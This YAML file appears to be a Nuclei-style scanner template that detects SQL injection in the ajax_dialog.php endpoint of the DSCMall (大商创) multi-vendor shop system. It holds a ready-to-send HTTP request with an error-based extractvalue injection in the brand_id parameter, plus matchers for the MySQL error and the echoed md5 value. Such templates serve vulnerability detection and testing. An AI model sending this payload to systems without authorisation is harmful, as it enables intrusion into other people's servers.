id: poc-yaml-dscmall-ajax-dialog-php-sqli
info:
  name: "大商创多用户商城系统 ajax_dialog.php SQL注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    SQL Injection vulnerability in 大商创多用户商城系统 via the ajax_dialog.php endpoint.

variables:
  t1: "{{rand_int(100, 1000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /ajax_dialog.php?_=1600309513833&act=getUserInfo&brand_id=extractvalue(1,concat(0x7e,md5({{t1}})))&is_jsonp=1&jsoncallback=jQuery19106489774159975068_1600309513832&seckillid=null&temp=backup_tpl_1 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "MySQL server error report:Array"
          - "XPATH syntax error:"
      - type: word
        part: body
        words:
          - "{{substr(t2, 0, 31)}}"
